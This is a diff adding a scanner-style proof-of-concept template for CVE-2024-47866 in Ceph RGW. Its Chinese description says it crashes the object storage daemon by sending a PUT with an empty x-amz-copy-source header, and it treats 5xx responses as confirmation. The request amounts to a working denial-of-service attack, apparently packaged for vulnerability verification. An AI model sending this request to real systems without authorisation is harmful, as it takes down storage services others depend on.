@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "Ceph RGW S3对象复制空HTTP标头拒绝服务漏洞验证。通过发送包含空x-amz-copy-source头的PUT请求触发RGW守护进程崩溃，导致对象存储服务不可用。"
+id = "POC-AVE-2024-0533"
+name = "CVE-2024-47866 PoC"
+severity = "high"
+tags = ["cve-2024-47866"]
+vuln_id = [
+    "CVE-2024-47866",
+    "AVE-2024-0533",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PUT"
+path = "/{{BaseURL}}/poc-test-obj"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+x-amz-copy-source = ""
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+]
+type = "status"
